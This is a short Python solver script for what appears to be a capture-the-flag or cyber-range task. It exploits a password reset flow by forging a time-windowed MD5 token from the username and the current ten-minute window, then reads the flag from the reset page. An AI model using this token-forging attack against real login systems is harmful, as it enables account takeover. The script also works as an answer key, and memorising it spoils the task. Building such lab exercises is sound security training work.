"""Intended-path solver: forge the time-windowed password reset token."""

import hashlib
import time

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags

USERNAME = "ada"


def window_token(username: str) -> str:
    return hashlib.md5(f"{username}:{int(time.time()) // 600}".encode()).hexdigest()


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    base = ctx.url()
    httpx.post(f"{base}/forgot", data={"username": USERNAME}, timeout=10)
    params = {"username": USERNAME, "token": window_token(USERNAME)}
    res = httpx.get(f"{base}/reset", params=params, timeout=10)
    if res.status_code == 403:
        # The 10-minute window rolled over between minting and checking.
        params["token"] = window_token(USERNAME)
        res = httpx.get(f"{base}/reset", params=params, timeout=10)
    flags = find_flags(res.text)
    captured = flags[0] if flags else None
    return SolveResult(
        results=[
            TaskResult(
                task_id="forged-reset-token",
                ok=bool(captured),
                captured=captured,
                detail=None if captured else "reset page did not yield the flag",
            )
        ]
    )
